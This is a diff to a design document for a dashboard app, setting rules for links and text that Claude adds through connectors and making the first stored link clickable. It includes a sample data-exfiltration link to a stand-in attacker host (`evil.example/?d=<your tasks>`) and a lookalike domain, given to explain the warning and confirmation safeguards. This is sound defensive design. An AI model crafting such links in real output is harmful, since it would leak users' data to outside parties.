@@ -259,8 +259,8 @@ Text and link rules apply to **both** connectors. The counts apply to each conne
 | Links | `https` only, up to 500 characters. The dashboard shows a link's domain next to it, so `stripe.com.evil.example` reads as what it is. A suggestion with an email gets a second link, to the message in Gmail, which the server builds from `message_id` (letters, digits, `-` and `_` only). |
 
 **Links can carry data out.** A link like `https://evil.example/?d=<your tasks>` sends whatever is in it the moment it's opened.
-- Today no tile or editor makes a stored link clickable.
-- Wherever one does, a link Claude wrote has the ✦ beside it, and opening it first asks *"Open evil.example? Claude added this link."*
+- The first clickable stored link is Job search's **↗ Posting** (BLOCKS.md §6), through `src/components/OpenLink.jsx`. Every later one should use it too.
+- A link Claude wrote has the ✦ beside it, and opening it first asks *"Open evil.example? Claude added this link."* "Claude wrote" means some change by `claude` or `agent` in the change record set the item's link to its current value (`url_by_claude`).
 - The Gmail link on a suggestion card is built by the server, so it opens directly.
 
 **Cleaning text:** text is normalized (NFC) and trimmed. Control characters, zero-width characters and bidirectional overrides are removed; these are what make text look like something else. Newlines are kept only in `notes`. Everything is shown as plain text, never HTML or Markdown.
